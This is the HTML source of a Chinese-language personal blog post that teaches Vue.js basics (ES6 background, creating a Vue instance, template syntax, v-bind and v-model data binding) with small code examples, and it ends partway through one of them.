<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915202948035.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915204130346.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915222417430.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915224653157.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916105028796.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916104405246.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916105445512.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916105718592.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916105818365.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916110156960.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916110239879.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916110708786.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916112146322.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916113922697.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916114702169.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916114854880.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916115014247.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916124723761.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916125212456.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916155515684.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916155444188.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916184913214.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916200713633.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916201441373.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916201923086.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916202853310.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916203131932.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916203148520.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916203631945.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916204358861.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916205216079.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916205835169.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916210624705.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922153212627.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922153934140.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922154204233.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922155837928.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922155919851.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922160331057.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922160712256.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922161049459.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922194913308.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922195250243.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922195416008.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922195445816.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922195727192.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922195936919.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922200047547.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922200028275.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/54.gif">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922203607771.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922203709444.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922204351765.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922204453305.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922204842412.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922204931655.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922205903733.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922210026139.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922205756937.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922210620929.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922223619270.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922224402039.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922224422262.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922233230075.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922233237581.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922234200366.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922234153070.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922234139920.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922234106377.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922234839892.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922235116129.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210922235139712.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923090448061.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923095223720.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923095456296.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923100031294.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923100125877.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923100435381.png">
<meta property="og:image" content="c:/Users/LEGION/AppData/Roaming/Typora/typora-user-images/image-20210923170521686.png">
<meta property="og:image" content="c:/Users/LEGION/AppData/Roaming/Typora/typora-user-images/image-20210923190702114.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923200541037.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923201002203.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923203255201.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923205136890.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923205241221.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923205656055.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923210434659.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923214057164.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923214503467.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/55.gif">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923215520566.png">
<meta property="og:image" content="c:/Users/LEGION/AppData/Roaming/Typora/typora-user-images/image-20210924170432116.png">
<meta property="og:image" content="c:/Users/LEGION/Pictures/gif/56.gif">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210924172232414.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210924172315814.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210924172715816.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210924172803367.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210924173023911.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210924173132608.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210924175755345.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/57.gif">
<meta property="og:image" content="c:/Users/LEGION/AppData/Roaming/Typora/typora-user-images/image-20210924191713551.png">
<meta property="og:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210924192932190.png">
<meta property="article:published_time" content="2021-08-01T02:33:59.000Z">
<meta property="article:modified_time" content="2021-10-22T09:00:48.354Z">
<meta property="article:author" content="Mike Taylor">
<meta property="article:tag" content="Vue">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/1.gif">
  
  <title>Vue全家桶 - Mike Taylor</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"github.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":100,"cursorChar":"|","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"e71cddb60357a788e6ed79bca37db76d","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>

    <!--自定义看板娘-->
    <script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
    <script src="/live2d-widget/autoload.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"/>
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Mike Taylor&#39;s</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/p12.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="Vue全家桶">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-08-01 10:33" pubdate>
        2021年8月1日 上午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      135k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      676 分钟
    </span>
  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Vue全家桶</h1>
            
            <div class="markdown-body">
              <h1 id="Vue全家桶"><a href="#Vue全家桶" class="headerlink" title="Vue全家桶"></a>Vue全家桶</h1><h2 id="课程概述"><a href="#课程概述" class="headerlink" title="课程概述"></a>课程概述</h2><p>前端框架—&gt; Vue 2.0 —&gt; Vue3.0</p>
<ul>
<li>VUE基础</li>
<li>VUE-CLI</li>
<li>VUE-ROUTER</li>
<li>VUEX</li>
<li>ELEMENT-UI</li>
<li>VUE3.0</li>
</ul>
<h2 id="基础内容-ES6"><a href="#基础内容-ES6" class="headerlink" title="基础内容 ES6"></a>基础内容 ES6</h2><p>全称ECMAScript6.0，是JavaScript（ECMAScript的一种实现）的下一个版本标准，2015.06发布，主要为了解决ES5先天的不足，比如JavaScript里没有类的概念，但是目前浏览器的JavaScript是ES5版本，大多数高版本浏览器也支持ES6，不过只实现了ES6的部分特性和功能。</p>
<p>ES新特性指的是JavaScript的新特性，包括ES6-ES11版本。</p>
<p>ECMA:European Computer Manufacturers Association，中文名称为欧洲计算机制造商协会，这个组织的目标是评估、开发、认可电信和计算机标准。</p>
<p>ECMAScript：由ECMA国际通过ECMA-262标准化的脚本程序设计语言。</p>
<ul>
<li>学习ES6的原因：<ul>
<li>ES6的版本变动最多，具有里程碑的意义。</li>
<li>ES6加入许多新的语法特性，编程实现更加简单、高效。</li>
<li>ES6是前端发展的趋势，就业的必备技能。</li>
</ul>
</li>
</ul>
<p>浏览器兼容性表格：<a href="http://kangax.github.io/compat-table/es6/">ECMAScript 6 compatibility table (kangax.github.io)</a></p>
<h2 id="第一章-VUE核心"><a href="#第一章-VUE核心" class="headerlink" title="第一章 VUE核心"></a>第一章 VUE核心</h2><h3 id="1-1-Vue简介"><a href="#1-1-Vue简介" class="headerlink" title="1.1 Vue简介"></a>1.1 Vue简介</h3><p>一套用于构建用户界面的渐进式JavaScript框架</p>
<p>VUE可以自底向上逐层的应用</p>
<p>简单应用：只需要一个轻量小巧的核心库</p>
<p>复杂应用：可以引入各式各样的VUE插件</p>
<p>开发者：尤雨溪</p>
<ul>
<li><p>VUE特点：</p>
<ul>
<li>采用组件化模式，提高代码的复用率，且让代码更好维护。</li>
<li>声明式编码，让编码人员无需直接操作DOM，提高开发效率。</li>
</ul>
</li>
<li><p>JS的基础知识：</p>
<ul>
<li>ES6语法规范</li>
<li>ES6模块化</li>
<li>包管理器</li>
<li>原型、原型链</li>
<li>数组常用方法</li>
<li>axios</li>
<li>promise</li>
</ul>
</li>
</ul>
<h3 id="1-2-初识VUE"><a href="#1-2-初识VUE" class="headerlink" title="1.2 初识VUE"></a>1.2 初识VUE</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;!DOCTYPE html&gt;<br>&lt;html lang&#x3D;&quot;en&quot;&gt;<br>  &lt;head&gt;<br>    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;<br>    &lt;title&gt;初识VUE&lt;&#x2F;title&gt;<br>    &lt;!--引入VUE--&gt;<br>    &lt;script src&#x3D;&quot;..&#x2F;js&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt;<br>  &lt;&#x2F;head&gt;<br>  &lt;body&gt;<br>    &lt;!--准备一个容器--&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>      &lt;h1&gt;Hello&#123;&#123;name&#125;&#125;&lt;&#x2F;h1&gt;<br>    &lt;&#x2F;div&gt;<br><br>    &lt;script&gt;<br>      Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br><br>      &#x2F;&#x2F;创建Vue实例<br>        new Vue(&#123;<br>        el: &#39;#root&#39;, &#x2F;&#x2F; el用于指定当期VUE实例为哪个容器服务，值通常为css选择器字符串<br>        &#x2F;&#x2F; 或el:document.getElementById(&#39;root&#39;);<br>        &#x2F;&#x2F; data中用于存储数据，数据提供给el所指定的容器去使用，值我们暂时先写成一个对象<br>        data: &#123;<br>          name: &#39;World&#39;<br>        &#125;<br>      &#125;);<br>    &lt;&#x2F;script&gt;<br>  &lt;&#x2F;body&gt;<br>&lt;&#x2F;html&gt;<br></code></pre></td></tr></table></figure>

<ul>
<li>总结：<ul>
<li>想让vue工作，就必须创建一个vue实例，并且要传入一个配置对象</li>
<li>root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法</li>
<li>root容器里的代码称为【Vue模板】</li>
<li>root容器的作用：<ul>
<li>为VUE提供模板</li>
<li>告知VUE的工作成果展示位置</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="1-3分析Hello案例"><a href="#1-3分析Hello案例" class="headerlink" title="1.3分析Hello案例"></a>1.3分析Hello案例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>  &lt;!--准备一个容器--&gt;<br>  &lt;div class&#x3D;&quot;root&quot;&gt;<br>    &lt;h1&gt;Hello&#123;&#123;name.toUpperCase()&#125;&#125;,&#123;&#123;address&#125;&#125;,&#123;&#123;Date.now()&#125;&#125;&lt;&#x2F;h1&gt;<br>  &lt;&#x2F;div&gt;<br><br>  &lt;script&gt;<br>    Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br><br>    &#x2F;&#x2F;创建Vue实例<br>      new Vue(&#123;<br>      el: &#39;.root&#39;, &#x2F;&#x2F; el用于指定当期VUE实例为哪个容器服务，值通常为css选择器字符串<br>      &#x2F;&#x2F; 或 el: document.getElementsByClassName(&#39;root&#39;)[0],<br>      &#x2F;&#x2F; data中用于存储数据，数据提供给el所指定的容器去使用，值我们暂时先写成一个对象<br>      data: &#123;<br>        name: &#39;World&#39;,<br>        address: &#39;UESTC&#39;<br>      &#125;<br>    &#125;);<br>  &lt;&#x2F;script&gt;<br>&lt;&#x2F;body&gt;<br></code></pre></td></tr></table></figure>



<ul>
<li><p>注意区分JS表达式和JS代码</p>
<ul>
<li>表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方<ul>
<li>a</li>
<li>a+b</li>
<li>demo(1)</li>
</ul>
</li>
<li>代码<ul>
<li>if(){}</li>
<li>for(){}</li>
<li>JS表达式是一种特殊的JS代码（语句）</li>
</ul>
</li>
</ul>
</li>
<li><p>总结：</p>
<ul>
<li>容器和VUE实例一一对应</li>
<li>动态数据交付VUE实例托管</li>
<li>真实开发中只有一个VUE实例，并且会配合组件一起使用</li>
<li>中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性</li>
<li>一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新</li>
</ul>
</li>
</ul>
<h3 id="1-4-模板语法"><a href="#1-4-模板语法" class="headerlink" title="1.4 模板语法"></a>1.4 模板语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>  &lt;!--准备一个容器--&gt;<br>  &lt;div id&#x3D;&quot;root&quot;&gt;<br>    &lt;h1&gt;插值语法&lt;&#x2F;h1&gt;<br>    &lt;h3&gt;你好，Mike Taylor&lt;&#x2F;h3&gt;<br>    &lt;hr&#x2F;&gt;<br>    &lt;!--v-bind绑定：把&quot;&quot;中的数据当做JS表达式执行 --&gt;<br>    &lt;!-- 简写：v-bind简写成冒号 --&gt;<br>    &lt;a v-bind:href&#x3D;&quot;url&quot;&gt;我的博客&lt;&#x2F;a&gt;<br>  &lt;&#x2F;div&gt;<br><br>  &lt;script&gt;<br>    Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br><br>    &#x2F;&#x2F;创建Vue实例<br>      new Vue(&#123;<br>          el:&#39;#root&#39;,<br>          data:&#123;<br>              url:&#39;https:&#x2F;&#x2F;miketaylorjuly123.cn&#39;<br>          &#125;<br>      &#125;);<br>  &lt;&#x2F;script&gt;<br>&lt;&#x2F;body&gt;<br></code></pre></td></tr></table></figure>

<ul>
<li>VUE模板语法有两大类：<ul>
<li>插值语法<ul>
<li>功能：用于解析标签体内容</li>
<li>写法：,xxx是JS表达式，且可以直接读取到data中的所有属性，不包括用户自定义属性</li>
</ul>
</li>
<li>指令语法<ul>
<li>功能：用于解析标签（包括：标签属性、标签体内容、绑定事件……）</li>
<li>举例：V-bind:herf=”xxx”  或 简写为 :href=”xxx”，xxx同样要写js表达式，且可以直接读取到data中的所有属性</li>
<li>备注：VUE中有很多指令，且形式都是：v-???，此处只是拿v-bind举例</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="1-5-数据绑定"><a href="#1-5-数据绑定" class="headerlink" title="1.5 数据绑定"></a>1.5 数据绑定</h3><p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/1.gif" srcset="/img/loading.gif" lazyload></p>
<p>错误示范：v-model只能应用于表单类元素上（输入类，要有value属性）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;h1 v-model&#x3D;&quot;name&quot;&gt;miketaylorjuly&lt;&#x2F;h1&gt;<br></code></pre></td></tr></table></figure>

<ul>
<li>总结<ul>
<li>单向绑定(v-bind)：数据只能从data流向页面</li>
<li>双向绑定(v-model)：数据不仅能data流向页面，还可以从页面流向data</li>
<li>备注：<ul>
<li>双向绑定一般都应用于表单类元素上（如：input、select）</li>
<li>v-model:value = “xxx” 可以**简写为v-model=”xxxx”**因为v-model默认收集value值</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>  &lt;!--准备一个容器--&gt;<br>  &lt;div id&#x3D;&quot;root&quot;&gt;<br>      单向数据绑定：&lt;input type&#x3D;&quot;text&quot; v-bind:value&#x3D;&quot;name&quot;&gt;<br>      双向数据绑定：&lt;input type&#x3D;&quot;text&quot; v-model&#x3D;&quot;name&quot;&gt;<br>  &lt;&#x2F;div&gt;<br><br>&lt;&#x2F;body&gt;<br>  &lt;script&gt;<br>    Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示<br>    new Vue(&#123;<br>        el:&#39;#root&#39;,<br>        data:&#123;<br>            name:&#39;Mike Taylor&#39;<br>        